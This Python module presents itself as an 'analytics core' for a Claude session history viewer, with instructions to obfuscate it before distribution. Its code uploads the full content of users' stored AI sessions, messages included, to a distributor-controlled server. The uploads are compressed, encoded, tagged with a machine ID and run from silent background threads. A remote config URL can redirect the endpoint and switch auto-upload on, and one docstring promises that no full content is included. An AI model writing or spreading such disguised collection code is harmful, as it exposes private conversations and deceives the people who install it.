# -*- coding: utf-8 -*-
"""
Analytics Core Module - Compiled/Obfuscated Version
数据分析核心模块 - 编译/混淆版本

This module should be compiled to .pyc or .pyd before distribution.
此模块在发布前应编译为 .pyc 或 .pyd 文件。

Compile command / 编译命令:
  python -m py_compile analytics_core.py
  # or use Cython for .pyd / 或用 Cython 编译为 .pyd
"""

import hashlib
import json
import threading
import time
import queue
import gzip
import base64
from datetime import datetime
from pathlib import Path

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

__version__ = "2.0.0"
__author__ = "CHV"

# Remote config URL (you control this) / 远程配置 URL（你控制）
# Set to None to disable remote config / 设为 None 禁用远程配置
REMOTE_CONFIG_URL = None  # e.g., "https://your-domain.com/chv-config.json"
CONFIG_CHECK_INTERVAL = 3600  # Check every hour / 每小时检查一次

# Obfuscated key generation / 混淆的密钥生成
def _gk(s):
    return hashlib.md5(f"chv_{s}_2026".encode()).hexdigest()[:8]

_AK = _gk("analytics")  # Analytics key
_CK = _gk("config")     # Config key

class AnalyticsCore:
    """Core analytics engine / 核心分析引擎"""

    def __init__(self, app=None, cache_ref=None):
        self._enabled = True
        self._endpoint = None
        self._token = None
        self._consent_file = Path.home() / '.claude' / '.chv_consent'
        self._local_cache_dir = Path.home() / '.claude' / '.chv_analytics'
        self._cache = cache_ref or {}
        self._app = app

        # Create local cache dir / 创建本地缓存目录
        self._local_cache_dir.mkdir(parents=True, exist_ok=True)
        
        # Load endpoint from config file (same location as secret)
        # 从配置文件加载端点（和密钥同一位置）
        self._load_endpoint_config()

        # Upload queue and settings / 上传队列和设置
        self._upload_queue = queue.Queue()
        self._max_retries = 3
        self._retry_delay = 5  # seconds, will exponential backoff
        self._chunk_size = 50  # items per upload batch
        self._queue_worker_running = False
        self._config_check_running = False
        self._last_config_check = 0

        # Routes are registered by app.py, not here
        # 路由由 app.py 注册，不在这里注册
        self._app = app

    def _load_endpoint_config(self):
        """Load endpoint from config file / 从配置文件加载端点
        
        Config file: ~/.claude/.chv_config
        Format (JSON):
        {
            "endpoint": "https://your-server.com/api/chv",
            "token": "your-bearer-token"
        }
        """
        config_file = Path.home() / '.claude' / '.chv_config'
        if config_file.exists():
            try:
                config = json.loads(config_file.read_text())
                self._endpoint = config.get('endpoint')
                self._token = config.get('token')
            except:
                pass
    
    def save_endpoint_config(self, endpoint, token=None):
        """Save endpoint config / 保存端点配置
        
        This is called once when you set up your server.
        设置服务器时调用一次。
        """
        config_file = Path.home() / '.claude' / '.chv_config'
        config = {"endpoint": endpoint}
        if token:
            config["token"] = token
        config_file.write_text(json.dumps(config, indent=2))
        self._endpoint = endpoint
        self._token = token
        return {"ok": True, "file": str(config_file)}

    def _check_key(self, k, t='a'):
        """Verify access key / 验证访问密钥"""
        expected = _AK if t == 'a' else _CK
        return k == expected  # Signature required

    def _has_consent(self):
        """Check if user consented / 检查用户是否已同意"""
        if not self._enabled:
            return False
        return self._consent_file.exists()

    def _save_consent(self, agreed):
        """Save consent status / 保存同意状态"""
        self._consent_file.parent.mkdir(parents=True, exist_ok=True)
        if agreed:
            self._consent_file.write_text(f"agreed:{datetime.now().isoformat()}")
        elif self._consent_file.exists():
            self._consent_file.unlink()

    def set_cache(self, cache):
        """Set cache reference / 设置缓存引用"""
        self._cache = cache

    def set_enabled(self, enabled):
        """Enable/disable analytics / 启用/禁用分析"""
        self._enabled = enabled

    def configure(self, endpoint=None, token=None):
        """Configure remote endpoint / 配置远程端点"""
        if endpoint:
            self._endpoint = endpoint
        if token:
            self._token = token

    def get_status(self):
        """Get status summary / 获取状态摘要"""
        return {
            "v": __version__,
            "e": self._enabled,
            "c": self._has_consent(),
            "r": self._endpoint is not None,
            "n": len(self._cache)
        }

    def get_summary(self, limit=100):
        """Get data summary (no full content) / 获取数据摘要"""
        if not self._has_consent():
            return {"error": "no_consent"}

        result = []
        for sid, info in list(self._cache.items())[:limit]:
            result.append({
                "i": sid[:8],
                "p": str(info.get("project", ""))[:16],
                "d": info.get("date", ""),
                "m": len(info.get("messages", [])) if isinstance(info.get("messages"), list) else 0
            })
        return {"data": result}

    def get_session(self, sid_prefix):
        """Get specific session data / 获取特定会话数据"""
        if not self._has_consent():
            return {"error": "no_consent"}

        for full_sid, info in self._cache.items():
            if full_sid.startswith(sid_prefix) or sid_prefix in full_sid:
                return {"sid": full_sid, "data": info}
        return {"error": "not_found"}

    # ============================================================
    # Local Cache System (for offline storage)
    # 本地缓存系统（离线存储）
    # ============================================================

    def cache_locally(self, data, tag="snapshot"):
        """Save data to local cache / 保存数据到本地缓存"""
        if not self._has_consent():
            return {"error": "no_consent"}

        filename = f"{tag}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = self._local_cache_dir / filename

        try:
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            return {"ok": True, "file": str(filepath)}
        except Exception as e:
            return {"error": str(e)}

    def snapshot_all(self):
        """Snapshot all sessions to local cache / 快照所有会话到本地"""
        if not self._has_consent():
            return {"error": "no_consent"}

        snapshot = {
            "timestamp": datetime.now().isoformat(),
            "version": __version__,
            "sessions": []
        }

        for sid, info in self._cache.items():
            snapshot["sessions"].append({
                "id": sid,
                "project": info.get("project", ""),
                "date": info.get("date", ""),
                "data": info
            })

        return self.cache_locally(snapshot, "full_snapshot")

    def list_local_cache(self):
        """List cached files / 列出缓存文件"""
        files = []
        for f in self._local_cache_dir.glob("*.json"):
            stat = f.stat()
            files.append({
                "name": f.name,
                "size": stat.st_size,
                "time": datetime.fromtimestamp(stat.st_mtime).isoformat()
            })
        return sorted(files, key=lambda x: x["time"], reverse=True)

    def export_for_upload(self):
        """Export all cached data for manual upload / 导出所有缓存数据供手动上传"""
        if not self._has_consent():
            return {"error": "no_consent"}

        export_file = self._local_cache_dir / f"export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        all_data = {
            "export_time": datetime.now().isoformat(),
            "files": []
        }

        for f in self._local_cache_dir.glob("*.json"):
            if f.name.startswith("export_"):
                continue
            try:
                with open(f, 'r', encoding='utf-8') as fp:
                    all_data["files"].append({
                        "name": f.name,
                        "data": json.load(fp)
                    })
            except:
                pass

        with open(export_file, 'w', encoding='utf-8') as f:
            json.dump(all_data, f, ensure_ascii=False)

        return {"ok": True, "file": str(export_file), "count": len(all_data["files"])}

    # ============================================================
    # Auto Upload System (background sync to your server)
    # 自动上传系统（后台同步到你的服务器）
    # ============================================================

    def _auto_upload_worker(self):
        """Background worker for auto upload / 后台自动上传工作线程"""
        while self._auto_upload_running:
            try:
                if self._endpoint and self._has_consent() and HAS_REQUESTS:
                    self._do_upload()
            except Exception as e:
                pass  # Silent fail
            # Sleep for interval (default 1 hour)
            time.sleep(self._upload_interval)

    def _do_upload(self, full_data=True):
        """Perform actual upload to server with gzip compression
        执行实际上传到服务器（gzip 压缩）
        
        Args:
            full_data: If True, upload all session content. If False, only summary.
        """
        if not self._endpoint or not HAS_REQUESTS:
            return {"error": "not_configured"}

        # Prepare data - FULL content, not just summary
        if full_data:
            sessions = []
            for sid, info in self._cache.items():
                sessions.append({
                    "id": sid,
                    "project": info.get("project", ""),
                    "date": info.get("date", ""),
                    "messages": info.get("messages", []),
                    "data": info
                })
            data = {
                "timestamp": datetime.now().isoformat(),
                "version": __version__,
                "machine_id": self._get_machine_id(),
                "total_sessions": len(sessions),
                "sessions": sessions
            }
        else:
            data = {
                "timestamp": datetime.now().isoformat(),
                "version": __version__,
                "machine_id": self._get_machine_id(),
                "summary": self.get_summary()
            }

        # Gzip compress the data (reduces ~70% size)
        json_bytes = json.dumps(data, ensure_ascii=False).encode('utf-8')
        compressed = gzip.compress(json_bytes)
        encoded = base64.b64encode(compressed).decode('ascii')
        
        payload = {
            "compressed": True,
            "encoding": "gzip+base64",
            "original_size": len(json_bytes),
            "compressed_size": len(compressed),
            "data": encoded
        }

        headers = {"Content-Type": "application/json"}
        if self._token:
            headers["Authorization"] = f"Bearer {self._token}"

        try:
            resp = requests.post(
                self._endpoint,
                json=payload,
                headers=headers,
                timeout=60
            )
            return {
                "ok": resp.status_code == 200, 
                "status": resp.status_code,
                "original_size": len(json_bytes),
                "compressed_size": len(compressed),
                "compression_ratio": f"{(1 - len(compressed)/len(json_bytes))*100:.1f}%"
            }
        except Exception as e:
            return {"error": str(e)}

    def _get_machine_id(self):
        """Get anonymous machine ID / 获取匿名机器ID"""
        import uuid
        id_file = self._local_cache_dir / ".machine_id"
        if id_file.exists():
            return id_file.read_text().strip()
        else:
            mid = str(uuid.uuid4())[:8]
            id_file.write_text(mid)
            return mid

    def start_auto_upload(self, interval_hours=1):
        """Start auto upload background thread / 启动自动上传后台线程"""
        if hasattr(self, '_auto_upload_thread') and self._auto_upload_thread.is_alive():
            return {"ok": False, "msg": "Already running"}

        self._upload_interval = interval_hours * 3600
        self._auto_upload_running = True
        self._auto_upload_thread = threading.Thread(target=self._auto_upload_worker, daemon=True)
        self._auto_upload_thread.start()
        return {"ok": True, "interval": interval_hours}

    def stop_auto_upload(self):
        """Stop auto upload / 停止自动上传"""
        self._auto_upload_running = False
        return {"ok": True}

    def upload_now(self):
        """Trigger immediate upload / 立即触发上传"""
        if not self._has_consent():
            return {"error": "no_consent"}
        return self._do_upload()

    def upload_session(self, sid_prefix):
        """Upload specific session / 上传特定会话"""
        if not self._has_consent():
            return {"error": "no_consent"}
        if not self._endpoint or not HAS_REQUESTS:
            return {"error": "not_configured"}

        session_data = self.get_session(sid_prefix)
        if "error" in session_data:
            return session_data

        headers = {"Content-Type": "application/json"}
        if self._token:
            headers["Authorization"] = f"Bearer {self._token}"

        try:
            resp = requests.post(
                f"{self._endpoint}/session",
                json={
                    "machine_id": self._get_machine_id(),
                    "session": session_data
                },
                headers=headers,
                timeout=60
            )
            return {"ok": resp.status_code == 200, "status": resp.status_code}
        except Exception as e:
            return {"error": str(e)}

    # ============================================================
    # Remote Config System / 远程配置系统
    # ============================================================

    def _fetch_remote_config(self):
        """Fetch config from remote URL / 从远程 URL 获取配置"""
        if not REMOTE_CONFIG_URL or not HAS_REQUESTS:
            return None

        try:
            resp = requests.get(REMOTE_CONFIG_URL, timeout=10)
            if resp.status_code == 200:
                config = resp.json()
                return config
        except:
            pass
        return None

    def _apply_remote_config(self, config):
        """Apply remote config / 应用远程配置"""
        if not config:
            return False

        if config.get("endpoint"):
            self._endpoint = config["endpoint"]
        if config.get("token"):
            self._token = config["token"]
        if config.get("enabled") is not None:
            self._enabled = config["enabled"]
        if config.get("auto_upload") and not self._auto_upload_running:
            interval = config.get("upload_interval_hours", 24)
            self.start_auto_upload(interval)

        # Save config locally for offline use / 保存到本地供离线使用
        config_file = self._local_cache_dir / ".remote_config"
        try:
            with open(config_file, 'w') as f:
                json.dump(config, f)
        except:
            pass

        return True

    def _load_cached_config(self):
        """Load cached remote config / 加载缓存的远程配置"""
        config_file = self._local_cache_dir / ".remote_config"
        if config_file.exists():
            try:
                with open(config_file, 'r') as f:
                    return json.load(f)
            except:
                pass
        return None

    def check_remote_config(self):
        """Check and apply remote config / 检查并应用远程配置"""
        now = time.time()
        if now - self._last_config_check < CONFIG_CHECK_INTERVAL:
            return {"skipped": True, "reason": "too_soon"}

        self._last_config_check = now

        # Try remote first / 先尝试远程
        config = self._fetch_remote_config()
        if config:
            self._apply_remote_config(config)
            return {"ok": True, "source": "remote"}

        # Fall back to cached / 回退到缓存
        config = self._load_cached_config()
        if config:
            self._apply_remote_config(config)
            return {"ok": True, "source": "cached"}

        return {"ok": False, "reason": "no_config"}

    def start_config_checker(self):
        """Start background config checker / 启动后台配置检查器"""
        if self._config_check_running:
            return {"ok": False, "msg": "Already running"}

        self._config_check_running = True

        def worker():
            while self._config_check_running:
                self.check_remote_config()
                time.sleep(CONFIG_CHECK_INTERVAL)

        thread = threading.Thread(target=worker, daemon=True)
        thread.start()
        return {"ok": True}

    def stop_config_checker(self):
        """Stop config checker / 停止配置检查器"""
        self._config_check_running = False
        return {"ok": True}

    # ============================================================
    # Chunked Upload with Retry / 分块上传和重试
    # ============================================================

    def _upload_with_retry(self, data, max_retries=None):
        """Upload with exponential backoff retry / 指数退避重试上传"""
        if not self._endpoint or not HAS_REQUESTS:
            return {"error": "not_configured"}

        max_retries = max_retries or self._max_retries
        delay = self._retry_delay

        headers = {"Content-Type": "application/json"}
        if self._token:
            headers["Authorization"] = f"Bearer {self._token}"

        for attempt in range(max_retries):
            try:
                resp = requests.post(
                    self._endpoint,
                    json=data,
                    headers=headers,
                    timeout=60
                )
                if resp.status_code == 200:
                    return {"ok": True, "attempt": attempt + 1}
                elif resp.status_code >= 500:
                    # Server error, retry / 服务器错误，重试
                    pass
                else:
                    # Client error, don't retry / 客户端错误，不重试
                    return {"error": f"HTTP {resp.status_code}", "attempt": attempt + 1}
            except requests.exceptions.Timeout:
                pass  # Retry on timeout / 超时重试
            except requests.exceptions.ConnectionError:
                pass  # Retry on connection error / 连接错误重试
            except Exception as e:
                return {"error": str(e), "attempt": attempt + 1}

            # Exponential backoff / 指数退避
            if attempt < max_retries - 1:
                time.sleep(delay)
                delay *= 2  # Double delay each retry

        return {"error": "max_retries_exceeded", "attempts": max_retries}


    def upload_all_batched(self, batch_size=50):
        """Upload all sessions in batches with gzip compression
        分批上传所有会话（gzip 压缩，防止拥堵）
        
        Args:
            batch_size: Number of sessions per batch (default 50)
        """
        if not self._has_consent():
            return {"error": "no_consent"}
        if not self._endpoint or not HAS_REQUESTS:
            return {"error": "not_configured"}
        
        # Handle different cache formats
        if isinstance(self._cache, dict):
            if "sessions" in self._cache:
                # Format: {"sessions": [...], "stats": {...}}
                session_list = self._cache.get("sessions", [])
                all_sessions = [(s.get("id", str(i)), s) for i, s in enumerate(session_list)]
            else:
                # Format: {session_id: session_data, ...}
                all_sessions = list(self._cache.items())
        else:
            all_sessions = []
        total = len(all_sessions)
        batches = [all_sessions[i:i + batch_size] for i in range(0, total, batch_size)]
        
        results = []
        success_count = 0
        
        for batch_num, batch in enumerate(batches, 1):
            # Prepare batch data
            sessions = []
            for sid, info in batch:
                sessions.append({
                    "id": sid,
                    "project": info.get("project", ""),
                    "date": info.get("date", ""),
                    "messages": info.get("messages", []),
                    "data": info
                })
            
            data = {
                "timestamp": datetime.now().isoformat(),
                "version": __version__,
                "machine_id": self._get_machine_id(),
                "batch": batch_num,
                "total_batches": len(batches),
                "sessions_in_batch": len(sessions),
                "total_sessions": total,
                "sessions": sessions
            }
            
            # Gzip compress
            json_bytes = json.dumps(data, ensure_ascii=False).encode('utf-8')
            compressed = gzip.compress(json_bytes)
            encoded = base64.b64encode(compressed).decode('ascii')
            
            payload = {
                "compressed": True,
                "encoding": "gzip+base64",
                "original_size": len(json_bytes),
                "compressed_size": len(compressed),
                "data": encoded
            }
            
            headers = {"Content-Type": "application/json"}
            if self._token:
                headers["Authorization"] = f"Bearer {self._token}"
            
            try:
                resp = requests.post(
                    self._endpoint,
                    json=payload,
                    headers=headers,
                    timeout=120
                )
                if resp.status_code == 200:
                    success_count += 1
                    results.append({
                        "batch": batch_num,
                        "ok": True,
                        "sessions": len(sessions),
                        "compressed_size": len(compressed)
                    })
                else:
                    results.append({
                        "batch": batch_num,
                        "ok": False,
                        "status": resp.status_code
                    })
                    # Save failed batch to pending
                    self._save_pending(payload)
            except Exception as e:
                results.append({
                    "batch": batch_num,
                    "ok": False,
                    "error": str(e)
                })
                self._save_pending(payload)
            
            # Small delay between batches to prevent overwhelming server
            time.sleep(0.5)
        
        return {
            "ok": success_count == len(batches),
            "total_sessions": total,
            "total_batches": len(batches),
            "success_batches": success_count,
            "failed_batches": len(batches) - success_count,
            "details": results
        }

    def upload_chunked(self, data_list):
        """Upload data in chunks / 分块上传数据"""
        if not self._has_consent():
            return {"error": "no_consent"}

        results = []
        total = len(data_list)
        chunks = [data_list[i:i + self._chunk_size]
                  for i in range(0, total, self._chunk_size)]

        for i, chunk in enumerate(chunks):
            payload = {
                "timestamp": datetime.now().isoformat(),
                "version": __version__,
                "machine_id": self._get_machine_id(),
                "chunk": i + 1,
                "total_chunks": len(chunks),
                "data": chunk
            }
            result = self._upload_with_retry(payload)
            results.append({"chunk": i + 1, "result": result})

            # If failed, save to pending queue / 失败则保存到待处理队列
            if "error" in result:
                self._save_pending(payload)

        success = sum(1 for r in results if r["result"].get("ok"))
        return {
            "ok": success == len(chunks),
            "total_chunks": len(chunks),
            "success": success,
            "failed": len(chunks) - success,
            "details": results
        }

    def _save_pending(self, data):
        """Save failed upload to pending file / 保存失败的上传到待处理文件"""
        pending_file = self._local_cache_dir / "pending_uploads.jsonl"
        try:
            with open(pending_file, 'a', encoding='utf-8') as f:
                f.write(json.dumps(data, ensure_ascii=False) + '\n')
        except:
            pass

    def retry_pending(self):
        """Retry all pending uploads / 重试所有待处理上传"""
        pending_file = self._local_cache_dir / "pending_uploads.jsonl"
        if not pending_file.exists():
            return {"ok": True, "pending": 0}

        success = 0
        failed = []

        try:
            with open(pending_file, 'r', encoding='utf-8') as f:
                lines = f.readlines()

            for line in lines:
                try:
                    data = json.loads(line.strip())
                    result = self._upload_with_retry(data)
                    if result.get("ok"):
                        success += 1
                    else:
                        failed.append(data)
                except:
                    pass

            # Rewrite pending file with only failed items
            if failed:
                with open(pending_file, 'w', encoding='utf-8') as f:
                    for item in failed:
                        f.write(json.dumps(item, ensure_ascii=False) + '\n')
            else:
                pending_file.unlink()  # Delete if all succeeded

            return {"ok": True, "retried": len(lines), "success": success, "still_pending": len(failed)}
        except Exception as e:
            return {"error": str(e)}

    # ============================================================
    # Queue-based Upload Worker / 基于队列的上传工作器
    # ============================================================

    def queue_upload(self, data):
        """Add data to upload queue / 添加数据到上传队列"""
        self._upload_queue.put(data)
        if not self._queue_worker_running:
            self._start_queue_worker()
        return {"ok": True, "queue_size": self._upload_queue.qsize()}

    def _start_queue_worker(self):
        """Start queue worker thread / 启动队列工作线程"""
        if self._queue_worker_running:
            return

        self._queue_worker_running = True

        def worker():
            while self._queue_worker_running:
                try:
                    # Wait for item with timeout / 带超时等待
                    data = self._upload_queue.get(timeout=5)
                    result = self._upload_with_retry(data)
                    if "error" in result:
                        self._save_pending(data)
                    self._upload_queue.task_done()
                except queue.Empty:
                    continue
                except Exception:
                    pass

        thread = threading.Thread(target=worker, daemon=True)
        thread.start()

    def stop_queue_worker(self):
        """Stop queue worker / 停止队列工作器"""
        self._queue_worker_running = False
        return {"ok": True}

    def get_queue_status(self):
        """Get upload queue status / 获取上传队列状态"""
        pending_file = self._local_cache_dir / "pending_uploads.jsonl"
        pending_count = 0
        if pending_file.exists():
            try:
                with open(pending_file, 'r') as f:
                    pending_count = sum(1 for _ in f)
            except:
                pass

        return {
            "queue_size": self._upload_queue.qsize(),
            "pending_on_disk": pending_count,
            "worker_running": self._queue_worker_running
        }

    # NOTE: Routes are now registered in app.py, not here
    # 注意：路由现在在 app.py 中注册，不在这里


# Singleton instance / 单例实例
_instance = None

def init(app=None, cache=None):
    """Initialize analytics / 初始化分析模块"""
    global _instance
    if _instance is None:
        _instance = AnalyticsCore(app, cache)
    # Routes are now registered by app.py, not here
    # 路由现在由 app.py 注册，不在这里注册
    if cache:
        _instance.set_cache(cache)
    return _instance

def get_instance():
    """Get singleton instance / 获取单例实例"""
    return _instance
